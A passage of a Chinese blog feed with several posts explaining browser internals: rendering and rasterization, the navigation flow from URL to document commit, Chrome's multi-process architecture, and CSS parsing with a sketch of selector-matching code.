title="栅格化（raster）操作"></a>栅格化（raster）操作</h2><p>绘制列表只是用来记录绘制顺序和绘制指令的列表，而实际上绘制操作是由渲染引擎中的合成线程来完成的。你可以结合下图来看下渲染主线程和合成线程之间的关系：</p><img src="/2020/08/16/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%B2%E6%9F%93%E6%B5%81%E7%A8%8B/img13.png" class=""><p>渲染进程中的合成线程和主线程</p><p>如上图所示，当图层的绘制列表准备好之后，主线程会把该绘制列表<strong>提交（commit）</strong>给合成线程，那么接下来合成线程是怎么工作的呢？</p><p>那我们得先来看看什么是视口，通常一个页面可能很大，但是用户只能看到其中的一部分，我们把用户可以看到的这个部分叫做<strong>视口（viewport）</strong>。</p><p>在有些情况下，有的图层可以很大，比如有的页面你使用滚动条要滚动好久才能滚动到底部，但是通过视口，用户只能看到页面的很小一部分，所以在这种情况下，要绘制出所有图层内容的话，就会产生太大的开销，而且也没有必要。</p><p>基于这个原因，<strong>合成线程会将图层划分为图块（tile）</strong>，这些图块的大小通常是 256x256 或者 512x512，如下图所示：</p><img src="/2020/08/16/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%B2%E6%9F%93%E6%B5%81%E7%A8%8B/img14.png" class=""><p>然后合成线程会按照视口附近的图块来优先生成位图，<strong>实际生成位图的操作是由栅格化来执行的。所谓栅格化，是指将图块转换为位图。而图块是栅格化执行的最小单位。</strong>渲染进程维护了一个栅格化的线程池，所有的图块栅格化都是在线程池内执行的，运行方式如下图所示：</p><img src="/2020/08/16/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%B2%E6%9F%93%E6%B5%81%E7%A8%8B/img15.png" class=""><p>合成线程提交图块给栅格化线程池</p><p>通常，栅格化过程都会使用 GPU 来加速生成，使用 GPU 生成位图的过程叫快速栅格化，或者 GPU 栅格化，生成的位图被保存在 GPU 内存中。</p><p>那么GPU 操作是运行在 GPU 进程中，如果栅格化操作使用了 GPU，那么最终生成位图的操作是在 GPU 中完成的，这就涉及到了跨进程操作。具体形式你可以参考下图：</p><img src="/2020/08/16/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%B2%E6%9F%93%E6%B5%81%E7%A8%8B/img16.png" class=""><p>GPU 栅格化</p><p>从图中可以看出，渲染进程把生成图块的指令发送给 GPU，然后在 GPU 中执行生成图块的位图，并保存在 GPU 的内存中。</p><h2 id="合成和显示"><a href="#合成和显示" class="headerlink" title="合成和显示"></a>合成和显示</h2><p>一旦所有图块都被光栅化，合成线程就会生成一个绘制图块的命令——“DrawQuad”，然后将该命令提交给浏览器进程。</p><p>浏览器进程里面有一个叫 viz 的组件，用来接收合成线程发过来的 DrawQuad 命令，然后根据 DrawQuad 命令，将其页面内容绘制到内存中，最后再将内存显示在屏幕上。</p><p>需要重点关注的是，合成操作是在合成线程上完成的，这也就意味着在执行合成操作时，是不会影响到主线程执行的。这就是为什么经常主线程卡住了，但是 CSS 动画依然能执行的原因。</p><p>到这里，经过这一系列的阶段，编写好的 HTML、CSS、JavaScript 等文件，经过浏览器就会显示出漂亮的页面了。</p><hr><h2 id="渲染流程总结"><a href="#渲染流程总结" class="headerlink" title="渲染流程总结"></a>渲染流程总结</h2><p>我们现在已经分析完了整个渲染流程，从 HTML 到 DOM、样式计算、布局、图层、绘制、光栅化、合成和显示。下面我用一张图来总结下这整个渲染流程：</p><img src="/2020/08/16/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%B2%E6%9F%93%E6%B5%81%E7%A8%8B/img17.png" class=""><p>完整的渲染流水线示意图</p><p>结合上图，一个完整的渲染流程大致可总结为如下：</p><ol><li>渲染进程将 HTML 内容转换为能够读懂的 <strong>DOM 树</strong>结构。</li><li>渲染引擎将 CSS 样式表转化为浏览器可以理解的 <strong>styleSheets</strong>，计算出 DOM 节点的样式。</li><li>创建<strong>布局树</strong>，并计算元素的布局信息。</li><li>对布局树进行分层，并生成<strong>分层树</strong>。</li><li>为每个图层生成<strong>绘制列表</strong>，并将其提交到合成线程。</li><li>合成线程将图层分成<strong>图块</strong>，并在<strong>光栅化线程池</strong>中将图块转换成位图。</li><li>合成线程发送绘制图块命令 <strong>DrawQuad</strong> 给浏览器进程。</li><li>浏览器进程根据 DrawQuad 消息<strong>生成页面</strong>，并显示到显示器上。</li></ol>]]></content>
    
    
    <categories>
      
      <category>浏览器</category>
      
    </categories>
    
    
    <tags>
      
      <tag>浏览器</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>浏览器导航流程</title>
    <link href="/2020/08/16/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AF%BC%E8%88%AA%E6%B5%81%E7%A8%8B/"/>
    <url>/2020/08/16/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AF%BC%E8%88%AA%E6%B5%81%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h2 id="从输入-URL-到页面展示，中间发生了什么？"><a href="#从输入-URL-到页面展示，中间发生了什么？" class="headerlink" title="从输入 URL 到页面展示，中间发生了什么？"></a>从输入 URL 到页面展示，中间发生了什么？</h2><p>这个是一道很经典的面试题，它能比较全面的考察一个人的网络、操作系统、Web 等相关知识。同时还可以把网络、操作系统、HTML、CSS、JS 这些知识串联起来。那么今天我们就来探索一下这个流程。</p><img src="/2020/08/16/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AF%BC%E8%88%AA%E6%B5%81%E7%A8%8B/1.png" class=""><p>上图就是从输入 URL 到页面展示完整流程示意图。我们先从大体上过一遍这个流程，然后在去看具体的细节。</p><ol><li>首先，浏览器进程接收到用户输入的 URL 请求，浏览器进程便将该 URL 转发给网络进程。</li><li>然后，在网络进程中发起真正的 URL 请求。</li><li>接着网络进程接收到了响应头数据，便解析响应头数据，并将数据转发给浏览器进程。</li><li>浏览器进程接收到网络进程的响应头数据之后，发送“提交导航 (CommitNavigation)”消息到渲染进程。</li><li>渲染进程接收到“提交导航”的消息之后，便开始准备接收 HTML 数据，接收数据的方式是直接和网络进程建立数据管道。</li><li>最后渲染进程会向浏览器进程“确认提交”，这是告诉浏览器进程：“已经准备好接受和解析页面数据了”。</li><li>浏览器进程接收到渲染进程“提交文档”的消息之后，便开始移除之前旧的文档，然后更新浏览器进程中的页面状态。</li></ol><p>在浏览器中，<strong>从用户发出 URL 请求到页面开始解析的这个过程，就叫做导航。</strong>下面我们就来详细分析一下各个阶段的细节。</p><h2 id="从输入-URL-到页面展示"><a href="#从输入-URL-到页面展示" class="headerlink" title="从输入 URL 到页面展示"></a>从输入 URL 到页面展示</h2><ol><li><p><strong>用户输入</strong></p><p> 当用户在地址栏中输入一个查询关键字时，地址栏会判断输入的关键字是搜索内容，还是请求的 URL。</p><ul><li><p>如果是搜索内容，地址栏会使用浏览器默认的搜索引擎，来合成新的带搜索关键字的 URL。</p></li><li><p>如果判断输入内容符合 URL 规则，那么地址栏会根据规则，把这段内容加上协议，合成为完整的 URL。</p><p>当用户输入关键字并键入回车之后，这意味着当前页面即将要被替换成新的页面，不过在这个流程继续之前，浏览器还给了当前页面一次执行 beforeunload 事件的机会，beforeunload 事件允许页面在退出之前执行一些数据清理操作，还可以询问用户是否要离开当前页面，比如当前页面可能有未提交完成的表单等情况，因此用户可以通过 beforeunload 事件来取消导航，让浏览器不再执行任何后续工作。</p><p>当我们按下回车后，标签页上的图标就变成了一个 loading 状态，但是这个时候的页面还是之前的页面。当渲染进程发出“提交文档”的信息后，页面的内容才会被替换。</p><img src="/2020/08/16/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AF%BC%E8%88%AA%E6%B5%81%E7%A8%8B/4.png" class=""></li></ul></li><li><p><strong>URL 请求过程</strong></p><p> 接下来，便进入了页面资源请求过程。这时，浏览器进程会通过进程间通信（IPC）把 URL 请求发送至网络进程，网络进程接收到 URL 请求后，会在这里发起真正的 URL 请求流程。那具体流程是怎样的呢？</p><p> 首先，网络进程会查找本地缓存是否缓存了该资源。如果有缓存资源，那么直接返回资源给浏览器进程；如果在缓存中没有查找到资源，那么直接进入网络请求流程。</p><p> 请求的第一步是要进行 DNS 解析。这个时候 Chrome 会先去查它自己的 DNS 缓存，再查系统缓存，再查 host 文件，然后再逐级往上查，直到根域名服务器。为了提高查询效率，这里的每一层都会有很多缓存。</p> <img src="/2020/08/16/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AF%BC%E8%88%AA%E6%B5%81%E7%A8%8B/3.png" class=""><p> 解析完 DNS 后，便可以获取请求域名的服务器 IP 地址。如果请求协议是 HTTPS，那么还需要建立 TLS 连接。</p><p> 接下来就是利用 IP 地址和服务器建立 TCP 连接。连接建立之后，浏览器端会构建请求行、请求头等信息，并把和该域名相关的 Cookie 等数据附加到请求头中，然后向服务器发送构建的请求信息。</p><p> 服务器收到请求信息后，会根据请求信息生成响应数据，然后发送给浏览器的网络进程。等网络进程收到响应头后，就开始解析响应头的内容。</p><p> 如果响应头中的状态码是301或302，那么就说明服务器需要浏览器重定向其他 URL，这个时候网络进程会从响应头的 Location 字段里面取出重定向的地址，然后发起新的请求，这个流程就会重头开始。</p><p> 如果响应头中的状态码是200，那么网络进程就可以继续处理这个请求。在响应头中有一个非常重要的字段，叫 Content-Type ，它的作用是告诉浏览器服务器返回的响应体数据是什么类型的。然后浏览器会根据 Content-Type 字段的值来决定如何处理响应体的内容。</p><p> 比如，content-type 的值是 text/html，浏览器就知道服务器返回的数据是 HTML 格式。或者 content-type 的值是 application/octet-stream，这个格式就是一个字节流类型，通常情况，浏览器会判断它为下载类型，那么这个内容会被提交给浏览器的下载管理器，然后去下载它，同时这个 URL 请求的导航流程就到此结束了。但如果是 html 类型，那么浏览器会继续下面的导航流程。</p><p> 关于浏览器是如何解析服务端发来的字节流（Bytes），下面有个 Toy 版的实现。实现原理就是使用状态机逐个解析响应头中的 statusLine、headers、body，然后封装成对象。</p><p> <a href="https://github.com/huyinglin/ToyBrowser/blob/master/parser/httpParser.js">huyinglin/ToyBrowser</a></p></li><li><p><strong>准备渲染进程</strong></p><p> 默认情况下，<strong>Chrome会为每个页面分配一个渲染进程</strong>，也就是说，每打开一个新页面就会配套创建一个新的渲染进程。但是，也有一些列外，在某些情况下，浏览器会让多个页面直接运行在同一个渲染进程中。</p> <img src="/2020/08/16/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AF%BC%E8%88%AA%E6%B5%81%E7%A8%8B/2.png" class=""><p> 渲染进程</p><p> 比如我从百度里打开了另外一个页面—百度搜索，我们看下面的任务管理器截图：</p> <img src="/2020/08/16/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AF%BC%E8%88%AA%E6%B5%81%E7%A8%8B/5.png" class=""></li></ol><p>从图中可以看出，打开的这三个页面都是运行在同一个渲染进程中的，进程ID是76086.</p><p><strong>那什么情况下会多个页面同时运行在一个渲染进程中呢？</strong></p><p>首先我们要先了解一下什么是同一站点（same-site）。具体来讲，同一站点定义如下：</p><ul><li>跟域名相同</li><li>协议相同</li><li>包含该域名下所有的子域名和不同的端口</li></ul><p>这里需要注意，同一站点和同源策略是有区别的，同源是指：域名、协议、端口相同。</p><p>Chrome 的默认策略是，每个标签对应一个渲染进程。<strong>但如果从一个页面打开了另一个新页面，而新页面和当前页面属于同一站点的话，那么新页面会复用父页面的渲染进程。</strong>官方把这个默认策略叫 process-per-site-instance。</p><p>总结来说，打开一个新页面采用的<strong>渲染进程策略</strong>就是：</p><ul><li>通常情况下，打开新的页面都会使用单独的渲染进程。</li><li>如果从 A 页面打开 B 页面，且 A 和 B 都属于同一站点的话，那么 B 页面复用 A 页面的渲染进程；如果是其他情况，浏览器进程则会为 B 创建一个新的渲染进程。</li><li>如果连接里面使用了 rel=”noopener noreferrer”这个属性，就会新打开一个渲染进程。使用 noopener noreferrer 就是告诉浏览器，新打开的子窗口不需要访问父窗口的任何内容，这是为了防止一些钓鱼网站窃取父窗口的信息。</li></ul><p>渲染进程准备好之后，还不能立即进入文档解析状态，因为此时的文档数据还在网络进程中，并没有提交给渲染进程，所以下一步就进入了提交文档阶段。</p><p><strong>4. 提交文档</strong></p><p>所谓提交文档，就是渲染进程要告诉浏览器进程，我已经收到网络进程的数据了，已经开始解析了，你可以更新页面状态了。</p><p>此时响应报文在网络进程那里，需要浏览器进程做一个统一调度，跟渲染进程说，你可以去接收响应报文了。然后渲染进程就通过 IPC 与网络进程通信，让网络进程把响应报文全部发过来。</p><p>渲染进程拿到所有响应报文，就会回复浏览器进程全部响应报文都拿到了，你浏览器进程可以更新界面，我渲染进程可以进行渲染。浏览器进程在收到“确认提交”的消息后，会更新浏览器界面状态。包括安全状态、地址栏的 URL、前进后退的历史状态，同时会停止标签页上的 loading 动画，然后更新 Web 页面。但这个时候的页面是白屏的。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>到这里，一个完整的导航流程就“走”完了，这之后就要进入渲染阶段了，关于渲染流程我会在下篇文章仔细介绍。 一旦文档被提交，渲染进程便开始页面解析和子资源加载了。渲染完成后，一个完整的页面就生成了。</p>]]></content>
    
    
    <categories>
      
      <category>浏览器</category>
      
    </categories>
    
    
    <tags>
      
      <tag>浏览器</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Chrome浏览器架构</title>
    <link href="/2020/08/16/Chrome%E6%B5%8F%E8%A7%88%E5%99%A8%E6%9E%B6%E6%9E%84/"/>
    <url>/2020/08/16/Chrome%E6%B5%8F%E8%A7%88%E5%99%A8%E6%9E%B6%E6%9E%84/</url>
    
    <content type="html"><![CDATA[<p>这篇文章，我们来讨论一下 Chrome 浏览器的架构。在讲架构之前，我们先来巩固一下两个概念：线程和进程。</p><h2 id="进程和线程"><a href="#进程和线程" class="headerlink" title="进程和线程"></a>进程和线程</h2><p>先来看看进程。简单来讲一个进程就是一个程序的运行实例。具体来讲，就是启动一个程序的时候，操作系统会为该程序创建一块内存，用来存放代码、运行中的数据和一个执行任务的主线程，我们把这样的一个运行环境叫进程。</p><p>一个进程里可以有多个线程。线程不能单独存在，它是依附于进程的，并由进程启动和管理。多个线程之间可以共享进程中的数据，它们可以对进程里的公共数据进行读写操作。同时，只要有一个线程崩溃，那么整个进程就会崩溃。</p><p>当一个进程关闭后，操作系统会回收这个进程所申请的所有资源。</p><p>线程和进程的关系如下图：</p><img src="/2020/08/16/Chrome%E6%B5%8F%E8%A7%88%E5%99%A8%E6%9E%B6%E6%9E%84/Untitled.png" class=""><p>了解完进程和线程之后，我们先来看看，远古时期的浏览器架构是什么样的。</p><h2 id="单进程浏览器"><a href="#单进程浏览器" class="headerlink" title="单进程浏览器"></a>单进程浏览器</h2><p>在大约十几年前，浏览器还是单进程的结构。比如 IE6，IE6是单标签的，就是一个页面一个窗口。它把所有功能模块都运行在同一个进程里，这些模块包含了网络、插件、JS引擎和渲染引擎等。</p><p>这么多功能模块运行在一个进程里显然是不稳定的。这种架构下就会出现，一个浏览器中，其中一个页面或者插件卡死，整个浏览器都崩溃了。所以单进程浏览器会有这么几个明显的问题：不稳定、不流畅、不安全。</p><img src="/2020/08/16/Chrome%E6%B5%8F%E8%A7%88%E5%99%A8%E6%9E%B6%E6%9E%84/Untitled1.png" class=""><h2 id="多进程浏览器"><a href="#多进程浏览器" class="headerlink" title="多进程浏览器"></a>多进程浏览器</h2><p>由于单进程浏览器存在诸多问题，之后就随之出现了多进程架构的浏览器。那么多进程架构是如何解决单进程架构问题的呢？</p><h3 id="早期多进程架构"><a href="#早期多进程架构" class="headerlink" title="早期多进程架构"></a>早期多进程架构</h3><img src="/2020/08/16/Chrome%E6%B5%8F%E8%A7%88%E5%99%A8%E6%9E%B6%E6%9E%84/Untitled2.png" class=""><p>这个是早期 Chrome 的进程架构图。它主要包含这几个进程：浏览器主进程、渲染进程、插件进程。各个进程之间通过 IPC 机制通信。</p><p>因为进程和进程之间是相互隔离的，所以当一个页面或插件崩溃的时候，影响到的仅仅是当前的页面进程或者插件进程，并不会影响到其他页面。这样就完美的解决了不稳定的问题。</p><p>我们再来看看，卡顿的问题是如何解决的。首先在多进程浏览器中，每新打开一个页面都会为其新建一个渲染进程。同样，JS也是运行在渲染进程中的，所以即便是JS阻塞了渲染进程，它影响的也只是当前的页面，不会影响到其他页面。</p><p>关于JS脚本导致的内存泄露问题。当关闭这个页面时，这个进程所占用的所有内存会被系统回收，所以根本不存在内存泄漏的问题。</p><p>最后我们再来看看安全问题是怎么解决的。多进程浏览器的额外好处就是可以使用沙箱，你可以把沙箱看成是操作系统给进程上了一把锁，沙箱里面的程序可以运行，但是不能在你的硬盘上读写数据。我们可以从这个图中看出来， Chrome 把对外的插件进程和渲染进程锁在沙箱里，这样即使渲染进程或者插件进程里有恶意程序，也无法突破沙箱的限制去获取系统权限。</p><h3 id="目前多进程架构"><a href="#目前多进程架构" class="headerlink" title="目前多进程架构"></a>目前多进程架构</h3><p>Chrome 的更新迭代非常迅速。相比之前，目前的架构又有了很多新的变化。那么我们来看看最新的Chrome 进程架构是什么样的。</p><img src="/2020/08/16/Chrome%E6%B5%8F%E8%A7%88%E5%99%A8%E6%9E%B6%E6%9E%84/Untitled3.png" class=""><p>从图中可以看出，现在的 Chrome 架构中包括下面几个进程：</p><ul><li>1个浏览器主进程</li><li>1个GPU进程</li><li>1个网络进程</li><li>多个渲染进程</li><li>多个插件进程</li></ul><p>首先最重要的就是浏览器主进程。它主要负责界面展示、用户交互、子进程管理，同时提供存储等功能。</p><p>渲染进程的核心任务是将 HTML、CSS 和 JS 转换为用户可以与之交互的网页。渲染引擎 Blink 和 V8 都是运行在该进程中。在默认情况下，chrome会为每个 Tab 页创建一个渲染进程，出于安全考虑，渲染进程都是运行在沙箱模式下的。</p><p>GPU进程。开始 Chrome 是没有 GPU 进程的。而 GPU 的使用初衷是为了实现 3D CSS 的效果。后来网页、Chrome 的 UI 界面都选择采用 GPU 绘制，这样使 GPU 成为浏览器的一个普遍需求。最后，Chrome 在架构上引入了 GPU 进程。</p><p>网络进程，主要负责页面的网络资源加载。以前它是作为一个模块运行在主进程里的，现在把它独立出来，成为一个单独的进程。</p><p>插件进程主要是负责插件的运行，因为插件容易崩溃，所以用进程来隔离插件出现的问题是一个很好的方案。</p><p>我们可以通过 Chrome 里的任务管理器来查看当前运行的进程。那么打开一个页面，至少需要 4个进程：1个浏览器进程、1个网络进程、1渲染进程、1个 GPU 进程，如果有插件的话，还有一些插件进程。</p><img src="/2020/08/16/Chrome%E6%B5%8F%E8%A7%88%E5%99%A8%E6%9E%B6%E6%9E%84/Untitled4.png" class=""><p>上图中还有一个进程：V8 代理解析工具，它是干什么用的呢？Chrome 支持使用 JavaScript 来写连接代理服务器脚本，又称为在线 PAC 代理脚本，使用 PAC 代理脚本可以实现一些会被请去喝茶的事情。刚开始的时候，Chrome 是在浏览器进程里面解析 PAC 代理脚本的，由于是 JavaScript脚 本，所有需要在浏览器进程里面引入 V8，不过把 V8 运行在浏览器进程似乎不太好，于是 Chrome 团队后来就把这个功能独立出来一个进程了，这个进程就叫“Utility: V8 Proxy Resolver”。</p><p>不过凡事都有两面性，虽然多进程模型提升了浏览器的稳定性、流畅性和安全性，但同样不可避免地带来了一些问题：</p><ul><li><strong>更高的资源占用。</strong>因为每个进程都会包含公共基础结构的副本（如 JavaScript 运行环境），这就意味着浏览器会消耗更多的内存资源。</li><li><strong>更复杂的体系架构。</strong>浏览器各模块之间耦合性高、扩展性差等问题，会导致现在的架构已经很难适应新的需求了。</li></ul><h3 id="未来面向服务的架构"><a href="#未来面向服务的架构" class="headerlink" title="未来面向服务的架构"></a>未来面向服务的架构</h3><p>对于这些问题，Chrome 团队一直在寻求一种弹性方案。在2016年，Chrome 团队使用了“<strong>面向服务的架构</strong>”（Services Oriented Architecture，简称 SOA）的思想设计了新的 Chrome 架构。</p><p>也就是说 Chrome 最终要把 UI、数据库、文件、设备、网络等模块重构为基础服务，类似操作系统底层服务，下面是 Chrome“面向服务的架构”的进程模型图：Chrome 整体架构会朝向现在操作系统所采用的“面试服务的架构”方向发展，原来的各种模块会被重构成独立的服务（Service），每个服务（Service）都可以在独立的进程中运行。从而构建一个<strong>更内聚、松耦合、易于维护和扩展</strong>的系统，更好实现 Chrome 简单、稳定、高速、安全的目标。</p><p>Chrome 最终要把 UI、数据库、文件、设备、网络等模块重构为基础服务，类似操作系统底层服务，下面是 Chrome“ 面向服务的架构”的进程模型图：</p><img src="/2020/08/16/Chrome%E6%B5%8F%E8%A7%88%E5%99%A8%E6%9E%B6%E6%9E%84/Untitled5.png" class=""><p>目前 Chrome 正处在老的架构向服务化架构过渡阶段，这将是一个漫长的迭代过程。Chrome 正在逐步构建 Chrome 基础服务（Chrome Foundation Service），如果你认为 Chrome 是“便携式操作系统”，那么 Chrome 基础服务便可以被视为该操作系统的“基础”系统服务层。</p><p>同时 Chrome 还提供灵活的弹性架构，在强大性能设备上会以多进程的方式运行基础服务，但是如果在资源受限的设备上（如下图），Chrome 会将很多服务整合到一个进程中，从而节省内存占用。</p><img src="/2020/08/16/Chrome%E6%B5%8F%E8%A7%88%E5%99%A8%E6%9E%B6%E6%9E%84/Untitled6.png" class=""><p>在资源不足的设备上，将服务合并到浏览器进程中</p><p>总体说来，Chrome 是以一个非常快速的速度在进化，越来越多的业务和应用都逐渐转至浏览器来开发。我们期待 Chrome 将来可以承托更多的业务场景，比如移动设备、VR、视频等。鉴于目前架构的复杂性，要完整过渡到面向服务架构，估计还需要好几年时间才能完成。不过 Chrome 开发是一个渐进的过程，新的特性会一点点加入进来，这也意味着我们随时能看到 Chrome 新的变化。</p>]]></content>
    
    
    <categories>
      
      <category>浏览器</category>
      
    </categories>
    
    
    <tags>
      
      <tag>浏览器</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSS的解析和计算</title>
    <link href="/2020/08/16/CSS%E7%9A%84%E8%A7%A3%E6%9E%90%E5%92%8C%E8%AE%A1%E7%AE%97/"/>
    <url>/2020/08/16/CSS%E7%9A%84%E8%A7%A3%E6%9E%90%E5%92%8C%E8%AE%A1%E7%AE%97/</url>
    
    <content type="html"><![CDATA[<p>通过上一篇《DOM 的解析》，我们已经知道当浏览器接收到 HTML 文本后，会将它解析成 Token ，再构建成 DOM 树。下面我们继续分析浏览器渲染流程的样式计算，即 CSS的解析和计算。</p><h3 id="一、收集CSS规则"><a href="#一、收集CSS规则" class="headerlink" title="一、收集CSS规则"></a>一、收集CSS规则</h3><p>浏览器开始处理 CSS 的第一步就是收集 CSS 规则。CSS 的规则来源有三种：</p><ol><li>内联规则</li><li>外联规则</li><li>行内规则</li></ol><p>如果浏览器遇到了一个 <code>&lt;link&gt;</code> 标签，<code>rel</code> 属性是 <code>stylesheet</code>，那么它会触发资源加载，根据标签里的 <code>href</code> 属性下载该资源。这个加载是异步的，不会影响DOM树的构建。</p><p>当遇到一个<code>&lt;style&gt;</code> 标签，整个<code>&lt;style&gt;</code> 标签解析结束的时候，浏览器会收集<code>&lt;style&gt;</code> 标签里的规则，存到一个地方。行内样式不收集。</p><p>收集完 CSS 规则后，会解析 CSS 。具体过程还是先进行词法分析，生成 Token。和 HTML 解析不同的是，CSS 词法分析后，还需要进行语法分析。解析后会生成相应的规则对象，并push到规则数组中。对象的内容可以通过 <code>document.styleSheets</code> 查看。</p><img src="/2020/08/16/CSS%E7%9A%84%E8%A7%A3%E6%9E%90%E5%92%8C%E8%AE%A1%E7%AE%97/css1.png" class=""><h3 id="二、解析CSS选择器"><a href="#二、解析CSS选择器" class="headerlink" title="二、解析CSS选择器"></a>二、解析CSS<strong>选择器</strong></h3><p>此时，CSS 规则已经被解析并放到一个规则数组里了。那么什么时候开始计算 CSS 呢？</p><p>通常情况下，当 HTML 解析完一个开始标签后就开始计算 CSS。原因是 CSS4 之前，不支持父选择器。所以在一个开始标签解析完后，所有的样式规则都已经收集完毕（一些特殊情况除外，如：style标签写在 body 里，这样会重新计算）。</p><p>CSS 规则的选择器是从右向左匹配。从右向左匹配时，如果当前元素不匹配，就可以直接跳过了。如果从左向右，要等到匹配最后一个选择器才能知道当前元素是否匹配。显然从右向左匹配效率会更高。</p><p>举个例子：</p><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span>      body div img &#123;        width: 500px;        height: 300px;      &#125;    <span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">img</span> /&gt;</span>      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre><p>上面代码中的 <code>&lt;style&gt;</code> 里的内容，大体会被解析成如下格式：</p><pre><code class="hljs html">rule: &#123;    type: &#x27;rule&#x27;,  selectors: [&#x27;body div img&#x27;],  declarations: [&#123;    type: &#x27;declaration&#x27;,    property: &#x27;width&#x27;,    value: &#x27;500px&#x27;,  &#125;, &#123;    type: &#x27;declaration&#x27;,    property: &#x27;height&#x27;,    value: &#x27;300px&#x27;,  &#125;],&#125;</code></pre><p>selectors 是这条规则的选择器，declarations 是这条规则的内容。下面我们来看看，当解析完 <code>&lt;img/&gt;</code> 时，会如何计算 <code>&lt;img/&gt;</code> 的 CSS 规则。</p><h3 id="三、拆分选择器"><a href="#三、拆分选择器" class="headerlink" title="三、拆分选择器"></a>三、<strong>拆分选择器</strong></h3><p>CSS 选择器由简单到复杂可以分成以下几种。</p><ul><li>简单选择器：针对某一特征判断是否选中元素。</li><li>复合选择器：连续写在一起的简单选择器，针对元素自身特征选择单个元素。</li><li>复杂选择器：由“（空格）”、“ &gt;”、“ ~”、“ +”、“ ||”等符号连接的复合选择器，根据父元素或者前序元素检查单个元素。</li><li>选择器列表：由逗号分隔的复杂选择器，表示“或”的关系。</li></ul><p>示例代码中的 <code>selectors: [&#39;body div img&#39;]</code> 是由空格连接的复杂选择器。空格表示匹配子孙元素。复杂选择器显然是不能直接匹配标签的，所以要把这个复杂选择器拆分。我们可以把标签名拆分出来：</p><pre><code class="hljs jsx"><span class="hljs-keyword">const</span> selectorParts = [<span class="hljs-string">&#x27;body&#x27;</span>, <span class="hljs-string">&#x27;div&#x27;</span>, <span class="hljs-string">&#x27;img&#x27;</span>];</code></pre><h3 id="四、选择器匹配"><a href="#四、选择器匹配" class="headerlink" title="四、选择器匹配"></a>四、<strong>选择器匹配</strong></h3><p>下一步就要匹配这些选择器了。当解析完 <code>&lt;img /&gt;</code> 后，浏览器会取 selectorParts 的最后一项：’img’，和当前元素 match。match 函数里实现了判断各种选择器是否和元素匹配。match 函数实现大体如下：</p><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">match</span>(<span class="hljs-params">element, selector</span>) </span>&#123;  <span class="hljs-comment">// element: &#123;</span>  <span class="hljs-comment">//   type: &#x27;element&#x27;,</span>  <span class="hljs-comment">//   tagName: &#x27;img&#x27;,</span>  <span class="hljs-comment">//   children: [],</span>  <span class="hljs-comment">//   attributes: [&#123;</span>  <span class="hljs-comment">//     name: &#x27;id&#x27;,</span>  <span class="hljs-comment">//     value: &#x27;myid&#x27;</span>  <span class="hljs-comment">//   &#125;, &#123;</span>  <span class="hljs-comment">//     name: &#x27;class&#x27;,</span>  <span class="hljs-comment">//     value: &#x27;myclass&#x27;</span>    <span class="hljs-comment">//   &#125;],</span>  <span class="hljs-comment">// &#125;</span>  <span class="hljs-comment">//</span>  <span class="hljs-comment">// selector: &#x27;img&#x27;</span>  <span class="hljs-keyword">if</span> (selector.charAt(<span class="hljs-number">0</span>) === <span class="hljs-string">&#x27;#&#x27;</span>) &#123;        <span class="hljs-comment">// id选择器</span>    <span class="hljs-keyword">const</span> attr = element.attributes.filter(<span class="hljs-function"><span class="hljs-params">attr</span> =&gt;</span> attr.name === <span class="hljs-string">&#x27;id&#x27;</span>)[<span class="hljs-number">0</span>];    <span class="hljs-keyword">if</span> (attr &amp;&amp; attr.value === selector.replace(<span class="hljs-string">&#x27;#&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)) &#123;      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;    &#125;  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (selector.charAt(<span class="hljs-number">0</span>) === <span class="hljs-string">&#x27;.&#x27;</span>) &#123;        <span class="hljs-comment">// class选择器</span>    <span class="hljs-keyword">const</span> attr = element.attributes.filter(<span class="hljs-function"><span class="hljs-params">attr</span> =&gt;</span> attr.name === <span class="hljs-string">&#x27;class&#x27;</span>)[<span class="hljs-number">0</span>];    <span class="hljs-keyword">if</span> (attr &amp;&amp; <span class="hljs-keyword">typeof</span> attr.value === <span class="hljs-string">&#x27;string&#x27;</span>) &#123;      <span class="hljs-comment">// 处理空格的多个class选择器</span>      <span class="hljs-keyword">const</span> classList = attr.value.split(<span class="hljs-string">&#x27; &#x27;</span>);      <span class="hljs-keyword">if</span> (classList.includes(selector.replace(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>))) &#123;        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;      &#125;    &#125;    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> () &#123;     <span class="hljs-comment">// 其他选择器</span>         ......  &#125; <span class="hljs-keyword">else</span> <span 